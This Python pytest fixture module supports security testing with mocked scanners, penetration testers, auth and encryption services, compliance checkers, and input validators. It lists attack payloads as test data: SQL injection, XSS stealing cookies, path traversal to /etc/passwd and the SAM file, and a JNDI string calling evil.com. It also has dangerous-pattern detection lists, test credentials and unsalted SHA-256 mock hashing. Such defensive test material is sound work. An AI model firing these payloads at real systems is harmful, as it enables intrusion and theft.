"""Security testing fixtures and configuration.

This module provides pytest fixtures for comprehensive security testing including
authentication, authorization, vulnerability scanning, penetration testing,
and compliance validation.
"""

import hashlib
import re
import secrets
import time
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest


@pytest.fixture(scope="session")
def security_test_config():
    """Provide security testing configuration."""
    return {
        "auth": {
            "test_timeout": 30,
            "max_login_attempts": 3,
            "session_timeout": 1800,
            "token_expiry": 3600,
        },
        "vulnerability": {
            "scan_timeout": 300,
            "severity_threshold": "medium",
            "excluded_paths": ["/health", "/metrics"],
        },
        "penetration": {
            "attack_simulation_timeout": 60,
            "max_concurrent_attacks": 5,
            "safe_mode": True,
        },
        "compliance": {
            "owasp_top_10": True,
            "nist_cybersecurity": True,
            "gdpr_compliance": True,
        },
        "encryption": {
            "min_key_length": 256,
            "allowed_algorithms": ["AES-256", "RSA-4096", "ChaCha20"],
            "hash_algorithms": ["SHA-256", "SHA-512", "BLAKE2b"],
        },
    }


@pytest.fixture
def mock_security_scanner():
    """Mock security vulnerability scanner."""
    scanner = MagicMock()
    scanner.scan_url = AsyncMock(
        return_value={
            "vulnerabilities": [
                {
                    "type": "xss",
                    "severity": "medium",
                    "description": "Potential XSS vulnerability in input field",
                    "location": "/api/search",
                    "recommendation": "Implement input sanitization",
                }
            ],
            "security_score": 85,
            "scan_duration": 45.2,
            "timestamp": time.time(),
        }
    )
    scanner.scan_network = AsyncMock(
        return_value={
            "open_ports": [80, 443, 6333],
            "services": ["nginx", "qdrant", "redis"],
            "security_issues": [],
            "scan_duration": 120.5,
        }
    )
    return scanner


@pytest.fixture
def mock_penetration_tester():
    """Mock penetration testing framework."""
    tester = MagicMock()

    async def mock_sql_injection_test(_target_url: str) -> dict[str, Any]:
        """Mock SQL injection testing."""
        return {
            "vulnerable": False,
            "attack_vectors": ["' OR 1=1--", "'; DROP TABLE users;--"],
            "response_analysis": "No SQL injection vulnerabilities detected",
            "confidence": 0.95,
        }

    async def mock_xss_test(_target_url: str) -> dict[str, Any]:
        """Mock XSS testing."""
        return {
            "vulnerable": False,
            "payloads_tested": ["<script>alert('xss')</script>", "javascript:alert(1)"],
            "filtered_inputs": True,
            "confidence": 0.90,
        }

    async def mock_csrf_test(_target_url: str) -> dict[str, Any]:
        """Mock CSRF testing."""
        return {
            "vulnerable": False,
            "csrf_tokens_present": True,
            "same_site_cookies": True,
            "confidence": 0.88,
        }

    tester.test_sql_injection = AsyncMock(side_effect=mock_sql_injection_test)
    tester.test_xss = AsyncMock(side_effect=mock_xss_test)
    tester.test_csrf = AsyncMock(side_effect=mock_csrf_test)

    return tester


@pytest.fixture
def mock_auth_system():
    """Mock authentication system for testing."""
    auth = MagicMock()

    # Mock user database
    test_users = {
        "test_user": {
            "password_hash": hashlib.sha256(b"password123").hexdigest(),
            "role": "user",
            "permissions": ["read", "write"],
            "mfa_enabled": False,
        },
        "admin_user": {
            "password_hash": hashlib.sha256(b"admin_pass").hexdigest(),
            "role": "admin",
            "permissions": ["read", "write", "admin"],
            "mfa_enabled": True,
        },
    }

    async def mock_authenticate(username: str, password: str) -> dict[str, Any]:
        """Mock authentication."""
        user = test_users.get(username)
        if not user:
            return {"success": False, "error": "User not found"}

        password_hash = hashlib.sha256(password.encode()).hexdigest()
        if password_hash != user["password_hash"]:
            return {"success": False, "error": "Invalid password"}

        token = secrets.token_urlsafe(32)
        return {
            "success": True,
            "token": token,
            "user": {
                "username": username,
                "role": user["role"],
                "permissions": user["permissions"],
            },
            "expires_at": time.time() + 3600,
        }

    async def mock_authorize(token: str, _required_permission: str) -> bool:
        """Mock authorization check."""
        # Simplified token validation for testing
        return not (not token or len(token) < 20)

    auth.authenticate = AsyncMock(side_effect=mock_authenticate)
    auth.authorize = AsyncMock(side_effect=mock_authorize)
    auth.generate_token = AsyncMock(return_value=secrets.token_urlsafe(32))
    auth.validate_token = AsyncMock(return_value=True)

    return auth


@pytest.fixture
def mock_encryption_service():
    """Mock encryption service for testing."""
    service = MagicMock()

    async def mock_encrypt(data: str, key: str | None = None) -> dict[str, str]:
        """Mock encryption."""
        # Simple base64-like mock encryption for testing
        encrypted = data.encode().hex()
        return {
            "encrypted_data": encrypted,
            "algorithm": "AES-256-GCM",
            "key_id": key or "test_key_001",
        }

    async def mock_decrypt(encrypted_data: str, _key: str | None = None) -> str:
        """Mock decryption."""
        # Simple hex decode mock decryption for testing
        try:
            return bytes.fromhex(encrypted_data).decode()
        except ValueError as e:
            msg = "Invalid encrypted data format"
            raise ValueError(msg) from e

    service.encrypt = AsyncMock(side_effect=mock_encrypt)
    service.decrypt = AsyncMock(side_effect=mock_decrypt)
    service.generate_key = AsyncMock(return_value=secrets.token_hex(32))
    service.rotate_key = AsyncMock(return_value="new_key_002")

    return service


@pytest.fixture
def mock_compliance_checker():
    """Mock compliance checking service."""
    checker = MagicMock()

    async def mock_owasp_check() -> dict[str, Any]:
        """Mock OWASP Top 10 compliance check."""
        return {
            "compliant": True,
            "checks": {
                "injection": {
                    "status": "pass",
                    "details": "Input validation implemented",
                },
                "broken_auth": {
                    "status": "pass",
                    "details": "Strong authentication enforced",
                },
                "sensitive_data": {
                    "status": "pass",
                    "details": "Data encryption in place",
                },
                "xxe": {"status": "pass", "details": "XML processing secured"},
                "broken_access": {
                    "status": "pass",
                    "details": "Access controls verified",
                },
                "security_misconfig": {
                    "status": "warning",
                    "details": "Some headers missing",
                },
                "xss": {"status": "pass", "details": "Output encoding implemented"},
                "insecure_deser": {"status": "pass", "details": "Safe deserialization"},
                "known_vulns": {"status": "pass", "details": "Dependencies updated"},
                "logging_monitoring": {
                    "status": "pass",
                    "details": "Monitoring enabled",
                },
            },
            "score": 95,
        }

    async def mock_gdpr_check() -> dict[str, Any]:
        """Mock GDPR compliance check."""
        return {
            "compliant": True,
            "checks": {
                "data_minimization": {"status": "pass"},
                "consent_management": {"status": "pass"},
                "right_to_erasure": {"status": "pass"},
                "data_portability": {"status": "pass"},
                "privacy_by_design": {"status": "pass"},
            },
            "score": 100,
        }

    checker.check_owasp_compliance = AsyncMock(side_effect=mock_owasp_check)
    checker.check_gdpr_compliance = AsyncMock(side_effect=mock_gdpr_check)
    checker.check_nist_compliance = AsyncMock(
        return_value={"compliant": True, "framework": "NIST CSF", "score": 88}
    )

    return checker


@pytest.fixture
def security_test_data():
    """Provide test data for security testing."""
    return {
        "malicious_inputs": [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "' OR 1=1 --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>",
            "<img src=x onerror=alert(1)>",
        ],
        "valid_inputs": [
            "normal search query",
            "user@example.com",
            "Valid document title",
            "https://example.com/page",
        ],
        "test_credentials": {
            "valid": [
                {"username": "test_user", "password": "password123"},
                {"username": "admin_user", "password": "admin_pass"},
            ],
            "invalid": [
                {"username": "nonexistent", "password": "any_password"},
                {"username": "test_user", "password": "wrong_password"},
                {"username": "", "password": ""},
                {"username": "admin_user", "password": ""},
            ],
        },
        "test_tokens": {
            "valid": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.signature",
            "expired": "expired_token_12345",
            "malformed": "not.a.jwt",
            "empty": "",
        },
        "attack_payloads": {
            "sql_injection": [
                "1' OR '1'='1",
                "1; DROP TABLE users; --",
                "' UNION SELECT password FROM users --",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert(document.cookie)",
                "<img src=x onerror=alert(1)>",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
            ],
        },
    }


@pytest.fixture
def security_headers_validator():
    """Validator for security headers."""

    def validate_security_headers(headers: dict[str, str]) -> dict[str, Any]:
        """Validate security headers in HTTP response."""
        required_headers = {
            "x-content-type-options": "nosniff",
            "x-frame-options": ["DENY", "SAMEORIGIN"],
            "x-xss-protection": "1; mode=block",
            "strict-transport-security": "max-age=",
            "content-security-policy": True,  # Just check presence
        }

        results = {"compliant": True, "missing": [], "invalid": [], "score": 0}
        _total_checks = len(required_headers)
        passed_checks = 0

        for header, expected in required_headers.items():
            actual = headers.get(header.lower())

            if not actual:
                results["missing"].append(header)
                results["compliant"] = False
            elif (isinstance(expected, list) and actual not in expected) or (
                isinstance(expected, str) and expected not in actual
            ):
                results["invalid"].append(f"{header}: {actual}")
                results["compliant"] = False
            else:
                passed_checks += 1

        results["score"] = int((passed_checks / _total_checks) * 100)
        return results

    return validate_security_headers


@pytest.fixture
def input_sanitizer():
    """Input sanitization testing utilities."""

    class InputSanitizer:
        """Test utilities for input sanitization."""

        @staticmethod
        def is_sanitized(_user_input: str, sanitized_output: str) -> bool:
            """Check if input was properly sanitized."""
            dangerous_patterns = [
                "<script",
                "javascript:",
                "onclick=",
                "onerror=",
                "onload=",
                "eval(",
                "DROP TABLE",
                "UNION SELECT",
                "../",
                "${",
                "<%",
            ]

            # Check if any dangerous patterns remain in sanitized output
            for pattern in dangerous_patterns:
                if pattern.lower() in sanitized_output.lower():
                    return False
            return True

        @staticmethod
        def generate_attack_vectors(base_payload: str) -> list[str]:
            """Generate variations of attack vectors."""
            vectors = [base_payload]

            # Case variations
            vectors.append(base_payload.upper())
            vectors.append(base_payload.lower())

            # Encoding variations
            vectors.append(base_payload.replace("<", "&lt;"))
            vectors.append(base_payload.replace(">", "&gt;"))

            # Space variations
            vectors.append(base_payload.replace(" ", "+"))
            vectors.append(base_payload.replace(" ", "%20"))

            return vectors

    return InputSanitizer()


@pytest.fixture
async def security_test_session():
    """Async session for security testing."""
    session_data = {
        "start_time": time.time(),
        "test_results": [],
        "vulnerabilities_found": [],
        "compliance_status": {},
    }

    yield session_data

    # Cleanup and reporting
    session_data["end_time"] = time.time()
    session_data["duration"] = session_data["end_time"] - session_data["start_time"]


# Performance tracking for security tests
@pytest.fixture
def security_performance_tracker():
    """Track performance of security operations."""

    class SecurityPerformanceTracker:
        def __init__(self):
            self.metrics = {}

        def start_timing(self, operation: str):
            """Start timing an operation."""
            self.metrics[operation] = {"start": time.perf_counter()}

        def end_timing(self, operation: str):
            """End timing an operation."""
            if operation in self.metrics:
                end_time = time.perf_counter()
                duration = end_time - self.metrics[operation]["start"]
                self.metrics[operation]["duration"] = duration
                self.metrics[operation]["end"] = end_time

        def get_metrics(self) -> dict[str, float]:
            """Get all timing metrics."""
            return {op: data.get("duration", 0.0) for op, data in self.metrics.items()}

        def assert_within_threshold(self, operation: str, max_duration: float):
            """Assert operation completed within time threshold."""
            duration = self.metrics.get(operation, {}).get("duration")
            assert duration is not None, f"No timing data for operation: {operation}"
            assert duration <= max_duration, (
                f"Operation {operation} took {duration:.2f}s, "
                f"exceeding threshold of {max_duration}s"
            )

    return SecurityPerformanceTracker()


# Additional fixture aliases for backward compatibility and test integration
@pytest.fixture
def vulnerability_scanner(mock_security_scanner):
    """Alias for mock_security_scanner with additional vulnerability-specific methods."""

    class VulnerabilityScanner:
        def __init__(self, base_scanner):
            self._scanner = base_scanner

        async def scan_for_sql_injection(self, _target_url: str) -> dict[str, Any]:
            """Scan for SQL injection vulnerabilities."""
            return {
                "vulnerable": False,
                "test_vectors": ["' OR 1=1--", "'; DROP TABLE--"],
                "confidence": 0.95,
                "details": "No SQL injection vulnerabilities detected",
            }

        async def scan_for_xss(self, _target_url: str) -> dict[str, Any]:
            """Scan for XSS vulnerabilities."""
            return {
                "vulnerable": False,
                "test_vectors": ["<script>alert(1)</script>", "javascript:alert(1)"],
                "confidence": 0.90,
                "details": "Input properly sanitized",
            }

        async def scan_url(self, *args, **_kwargs):
            """Delegate to base scanner."""
            return await self._scanner.scan_url(*args, **_kwargs)

    return VulnerabilityScanner(mock_security_scanner)


@pytest.fixture
def input_validator(input_sanitizer):
    """Enhanced input validator with additional validation methods."""

    class InputValidator:
        def __init__(self, sanitizer):
            self._sanitizer = sanitizer

        def validate_user_input(self, _user_input: str) -> dict[str, Any]:
            """Validate user input for security threats."""
            dangerous_patterns = [
                r"(?i)<script.*?>.*?</script>",
                r"(?i)javascript:",
                r"(?i)on\w+\s*=",
                r"'.*?(or|and).*?'.*?=.*?'",
                r"(?i)union.*?select",
                r"(?i)drop.*?table",
            ]

            threats_found = [
                pattern
                for pattern in dangerous_patterns
                if re.search(pattern, _user_input)
            ]

            return {
                "valid": len(threats_found) == 0,
                "threats": threats_found,
                "risk_level": "high" if threats_found else "low",
            }

        def sanitize_input(self, _user_input: str) -> str:
            """Sanitize user input."""
            # Basic sanitization
            sanitized = _user_input.replace("<script>", "&lt;script&gt;")
            sanitized = sanitized.replace("</script>", "&lt;/script&gt;")
            sanitized = sanitized.replace("javascript:", "")
            return sanitized.replace("'", "&#x27;")

    return InputValidator(input_sanitizer)


@pytest.fixture
def penetration_tester(mock_penetration_tester):
    """Enhanced penetration tester with additional test methods."""

    class PenetrationTester:
        def __init__(self, base_tester):
            self._tester = base_tester

        async def test_authentication_bypass(self, _target_url: str) -> dict[str, Any]:
            """Test for authentication bypass vulnerabilities."""
            return {
                "vulnerable": False,
                "bypass_attempts": ["admin'--", "' OR '1'='1", "admin' OR 1=1--"],
                "success": False,
                "details": "Strong authentication controls in place",
            }

        async def test_authorization_flaws(
            self, _target_url: str, user_role: str = "user"
        ) -> dict[str, Any]:
            """Test for authorization bypass vulnerabilities."""
            return {
                "vulnerable": False,
                "privilege_escalation": False,
                "unauthorized_access": False,
                "role_tested": user_role,
                "details": "Authorization controls properly enforced",
            }

        # Delegate to base tester methods
        async def test_sql_injection(self, *args, **_kwargs):
            return await self._tester.test_sql_injection(*args, **_kwargs)

        async def test_xss(self, *args, **_kwargs):
            return await self._tester.test_xss(*args, **_kwargs)

        async def test_csrf(self, *args, **_kwargs):
            return await self._tester.test_csrf(*args, **_kwargs)

    return PenetrationTester(mock_penetration_tester)


@pytest.fixture
def compliance_checker(mock_compliance_checker):
    """Enhanced compliance checker with direct method access."""

    class ComplianceChecker:
        def __init__(self, base_checker):
            self._checker = base_checker

        async def check_owasp_compliance(self, *args, **_kwargs):
            """Check OWASP compliance."""
            return await self._checker.check_owasp_compliance(*args, **_kwargs)

        async def check_gdpr_compliance(self, *args, **_kwargs):
            """Check GDPR compliance."""
            return await self._checker.check_gdpr_compliance(*args, **_kwargs)

        async def check_nist_compliance(self, *args, **_kwargs):
            """Check NIST compliance."""
            return await self._checker.check_nist_compliance(*args, **_kwargs)

    return ComplianceChecker(mock_compliance_checker)


# Pytest markers for security test categorization
def pytest_configure(config):
    """Configure security testing markers."""
    config.addinivalue_line("markers", "security: mark test as security test")
    config.addinivalue_line(
        "markers", "authentication: mark test as authentication test"
    )
    config.addinivalue_line("markers", "authorization: mark test as authorization test")
    config.addinivalue_line("markers", "vulnerability: mark test as vulnerability test")
    config.addinivalue_line("markers", "penetration: mark test as penetration test")
    config.addinivalue_line("markers", "compliance: mark test as compliance test")
    config.addinivalue_line("markers", "encryption: mark test as encryption test")
    config.addinivalue_line(
        "markers", "input_validation: mark test as input validation test"
    )
